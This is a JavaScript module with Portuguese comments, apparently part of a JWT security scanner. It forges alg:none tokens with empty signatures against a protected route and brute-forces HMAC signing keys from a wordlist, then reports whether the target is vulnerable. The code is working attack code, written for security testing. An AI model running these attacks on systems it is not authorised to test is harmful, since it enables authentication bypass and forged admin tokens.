// Scanner de ATAQUES — Fase 4
// A partir daqui o scanner PARA de só observar e começa a AGIR:
// forja tokens maliciosos, tenta chaves numa wordlist, e vê se o alvo cai.
//
// Passos:
//   4.1 — atacarAlgNone: reescreve o header pra alg:none e testa a rota protegida
//   4.2 — bruteForceHMAC: tenta descobrir a chave HMAC iterando uma wordlist

import { createHmac } from 'node:crypto';
import { coletarResposta } from '../utils/http.js';
import { WORDLIST } from '../utils/wordlist.js';

/**
 * Codifica uma string UTF-8 em Base64URL (sem padding).
 * Base64 padrão troca de char + reversão do padding — inverso do decodificarBase64Url.
 */
function codificarBase64Url(texto) {
	return Buffer.from(texto, 'utf-8')
		.toString('base64')
		.replace(/\+/g, '-')
		.replace(/\//g, '_')
		.replace(/=+$/, '');
}

/**
 * Pega um token real e devolve outro com header alg:none e assinatura vazia.
 * O payload é preservado — pra atacar você quer levar SUAS claims, tipo role:admin.
 */
function forjarTokenAlgNone(tokenOriginal) {
	const partes = tokenOriginal.split('.');
	if (partes.length !== 3) throw new Error('Token original inválido');

	// Novo header: alg:none, mantém typ pra parecer legítimo
	const novoHeader = codificarBase64Url(JSON.stringify({ alg: 'none', typ: 'JWT' }));

	// Payload original preservado
	const payloadOriginal = partes[1];

	// Assinatura vazia — é o "detalhe" do ataque alg:none.
	return `${novoHeader}.${payloadOriginal}.`;
}

/**
 * Passo 4.1 — Ataque alg:none.
 * Loga primeiro pra pegar um token real, forja a versão maliciosa,
 * manda na rota protegida e observa a reação.
 */
async function atacarAlgNone(alvo, motor) {
	// Pega um token real pra manipular
	let respLogin;
	try {
		respLogin = await coletarResposta(alvo.baseUrl + alvo.rotas.login, {
			metodo: 'POST',
			headers: { 'content-type': 'application/json' },
			body: JSON.stringify(alvo.credenciais),
		});
	} catch (erro) {
		motor.registrar({
			id: 'ataque-none-preparacao',
			categoria: 'ataque',
			descricao: 'Preparação: conseguiu logar pra pegar token real',
			gravidade: 'critica',
			passou: false,
			detalhes: `Falha no login: ${erro.message}`,
		});
		return;
	}

	let tokenReal;
	try {
		const body = JSON.parse(respLogin.corpo);
		tokenReal = body.accessToken || body.access_token || body.token;
	} catch {
		tokenReal = null;
	}
	if (!tokenReal) {
		motor.registrar({
			id: 'ataque-none-preparacao',
			categoria: 'ataque',
			descricao: 'Preparação: extraiu token do body do /login',
			gravidade: 'critica',
			passou: false,
			detalhes: 'Não encontrei accessToken na resposta.',
		});
		return;
	}

	// Forja o token malicioso
	const tokenForjado = forjarTokenAlgNone(tokenReal);

	// Dispara o ataque contra a rota protegida
	let respAtaque;
	try {
		respAtaque = await coletarResposta(alvo.baseUrl + alvo.rotas.protegida, {
			metodo: 'GET',
			headers: { authorization: `Bearer ${tokenForjado}` },
		});
	} catch (erro) {
		motor.registrar({
			id: 'ataque-none-execucao',
			categoria: 'ataque',
			descricao: 'Execução do ataque alg:none',
			gravidade: 'critica',
			passou: false,
			detalhes: `Erro chamando ${alvo.rotas.protegida}: ${erro.message}`,
		});
		return;
	}

	// Se voltou 2xx com token forjado, servidor é vulnerável — falha crítica.
	// Se voltou 401/403, alvo se defendeu — teste passou.
	const aceitouAtaque = respAtaque.status >= 200 && respAtaque.status < 300;
	motor.registrar({
		id: 'ataque-alg-none',
		categoria: 'ataque',
		descricao: 'Servidor REJEITA token com alg:none (não aceita bypass de assinatura)',
		gravidade: 'critica',
		passou: !aceitouAtaque,
		detalhes: aceitouAtaque
			? `⚠️ VULNERÁVEL: rota ${alvo.rotas.protegida} devolveu ${respAtaque.status} com token forjado sem assinatura. Qualquer atacante forja tokens de admin.`
			: `Servidor devolveu ${respAtaque.status}, rejeitou o token forjado — comportamento correto.`,
	});
}

/**
 * Calcula a assinatura HMAC-SHA256 que UM token TERIA se fosse assinado
 * com determinada chave. Usado pra comparar com a assinatura real.
 */
function calcularAssinaturaHS256(headerB64, payloadB64, chave) {
	return createHmac('sha256', chave)
		.update(`${headerB64}.${payloadB64}`)
		.digest('base64')
		.replace(/\+/g, '-')
		.replace(/\//g, '_')
		.replace(/=+$/, '');
}

/**
 * Passo 4.2 — Brute-force HMAC.
 * Pega o token real e tenta cada palavra da wordlist como se fosse
 * a chave secreta do servidor. Se alguma bater com a assinatura → chave revelada.
 */
async function bruteForceHMAC(alvo, motor) {
	// Precisa do token real primeiro
	let respLogin;
	try {
		respLogin = await coletarResposta(alvo.baseUrl + alvo.rotas.login, {
			metodo: 'POST',
			headers: { 'content-type': 'application/json' },
			body: JSON.stringify(alvo.credenciais),
		});
	} catch (erro) {
		motor.registrar({
			id: 'ataque-brute-preparacao',
			categoria: 'ataque',
			descricao: 'Preparação: conseguiu logar pra pegar token',
			gravidade: 'critica',
			passou: false,
			detalhes: erro.message,
		});
		return;
	}

	let tokenReal;
	try {
		const body = JSON.parse(respLogin.corpo);
		tokenReal = body.accessToken || body.access_token || body.token;
	} catch {
		tokenReal = null;
	}
	if (!tokenReal) return;

	const [headerB64, payloadB64, assinaturaReal] = tokenReal.split('.');

	// Só faz sentido para HS256; se o token é RS256 (assimétrico), brute-force não se aplica.
	let header;
	try {
		header = JSON.parse(Buffer.from(headerB64.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf-8'));
	} catch {
		return;
	}
	if (!header.alg || !header.alg.startsWith('HS')) {
		motor.registrar({
			id: 'ataque-brute-hmac',
			categoria: 'ataque',
			descricao: `Chave HMAC resistente a brute-force com wordlist de ${WORDLIST.length} entradas`,
			gravidade: 'critica',
			passou: true,
			detalhes: `Token usa ${header.alg}, não é HMAC — brute-force não aplicável.`,
		});
		return;
	}

	// Tenta cada palavra da wordlist como se fosse a chave
	let chaveDescoberta = null;
	for (const candidata of WORDLIST) {
		const assinaturaTeste = calcularAssinaturaHS256(headerB64, payloadB64, candidata);
		if (assinaturaTeste === assinaturaReal) {
			chaveDescoberta = candidata;
			break;
		}
	}

	motor.registrar({
		id: 'ataque-brute-hmac',
		categoria: 'ataque',
		descricao: `Chave HMAC resistente a brute-force com wordlist de ${WORDLIST.length} entradas`,
		gravidade: 'critica',
		passou: !chaveDescoberta,
		detalhes: chaveDescoberta
			? `⚠️ VULNERÁVEL: chave é "${chaveDescoberta}". Descoberta em segundos por wordlist. Atacante forja qualquer token que quiser.`
			: 'Chave não estava na wordlist. Isso NÃO garante segurança — só que a chave não é uma das óbvias. Use chaves aleatórias de 32+ bytes.',
	});
}

/**
 * Rodar todos os ataques da Fase 4.
 */
async function simularAtaques(alvo, motor) {
	await atacarAlgNone(alvo, motor);
	await bruteForceHMAC(alvo, motor);
}

export { simularAtaques, atacarAlgNone, bruteForceHMAC, forjarTokenAlgNone };
